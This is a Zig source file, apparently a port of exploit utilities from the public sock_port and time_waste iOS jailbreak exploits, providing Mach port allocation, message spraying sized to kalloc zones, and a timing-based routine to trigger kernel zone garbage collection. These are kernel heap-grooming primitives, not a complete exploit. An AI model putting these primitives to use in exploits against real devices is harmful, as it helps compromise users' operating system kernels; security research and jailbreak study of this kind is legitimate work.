// Port of "exploit_utilities" from Jake James' sock_port and time_waste.

const c = @cImport({
    @cInclude("mach/mach.h");
    @cInclude("sched.h");
});

const utils = @import("../utils.zig");

const std = @import("std");

pub const SimpleMessage = struct {
    header: c.mach_msg_header_t,
    body: [0]u8,
};

// time_waste
pub fn newMachPort() c.mach_port_t {
    var port = c.MACH_PORT_NULL;
    var ret = c.mach_port_allocate(
        c.mach_task_self(),
        c.MACH_PORT_RIGHT_RECEIVE,
        @ptrCast([*c]c.mach_port_t, &port),
    );
    if (ret) {
        utils.errorf("failed to allocate port", .{});
        return c.MACH_PORT_NULL;
    }

    ret = c.mach_port_insert_right(
        c.mach_task_self(),
        port,
        port,
        c.MACH_MSG_TYPE_MAKE_SEND,
    );
    if (ret) {
        utils.errorf("failed to insert right", .{});
        c.mach_port_destroy(c.mach_task_self(), port);
        return c.MACH_PORT_NULL;
    }

    var limits = c.mach_port_limits_t{0};
    limits.mpl_qlimit = c.MACH_PORT_QLIMIT_LARGE;
    ret = c.mach_port_set_attributes(
        c.mach_task_self(),
        port,
        c.MACH_PORT_LIMITS_INFO,
        @ptrCast(c.mach_port_info_t, &limits),
        c.MACH_PORT_LIMITS_INFO_COUNT,
    );
    if (ret) {
        utils.errorf("failed to increase queue limit", .{});
        c.mach_port_destroy(c.mach_task_self(), port);
        return c.MACH_PORT_NULL;
    }
    return port;
}

// time_waste
pub fn sendMessage(dest: c.mach_port_t, body: []u8) !c.kern_return_t {
    var msg_size = body.len + @sizeOf(SimpleMessage);
    var msg = @ptrCast(*SimpleMessage, utils.alloc.alloc(u8, msg_size) catch unreachable);
    std.mem.set(u8, @ptrCast([]u8, msg), 0);

    msg.header.msgh_remote_port = dest;
    msg.header.msgh_local_port = c.MACH_PORT_NULL;
    msg.header.msgh_bits = c.MACH_MSGH_BITS(c.MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.header.msgh_size = body.len;

    var ret = c.mach_msg(&msg.header, c.MACH_SEND_MSG, msg_size, 0, c.MACH_PORT_NULL, c.MACH_MSG_TIMEOUT_NONE, c.MACH_PORT_NULL);

    utils.alloc.free(@ptrCast([]u8, msg));

    if (ret) {
        utils.errorf("failed to send message", .{});
        c.mach_port_destroy(c.mach_task_self(), dest);
        return ret;
    }

    return c.KERN_SUCCESS;
}

// time_waste
pub inline fn messageSizeForKallocSize(comptime kalloc_size: comptime_int) comptime_int {
    return ((3 * kalloc_size) / 4) - 0x74;
}

// time_waste
pub fn triggerGC() void {
    const gc_ports_cnt = 1000;
    var gc_ports_max = gc_ports_cnt;
    var gc_ports = [1]c.mach_port_t{0} ** gc_ports_cnt;

    const body_size = messageSizeForKallocSize(16384) - @sizeOf(SimpleMessage);
    var body = [1]u8{0x41} ** body_size;

    var i: usize = 0;
    while (i < gc_ports_cnt) : (i += 1) {
        var t0 = c.mach_absolute_time();

        gc_ports[i] = newMachPort();
        sendMessage(gc_ports[i], &body);

        var t1 = c.mach_absolute_time();

        if (t1 - t0 > 1000000) {
            utils.infof("got GC at {}. breaking...", .{i});
            gc_ports_max = i;
            break;
        }
    }

    i = 0;
    while (i < gc_ports_max) : (i += 1) {
        c.mach_port_destroy(c.mach_task_self(), gc_ports[i]);
    }

    c.sched_yield();
    std.time.sleep(std.time.ns_per_s);
}
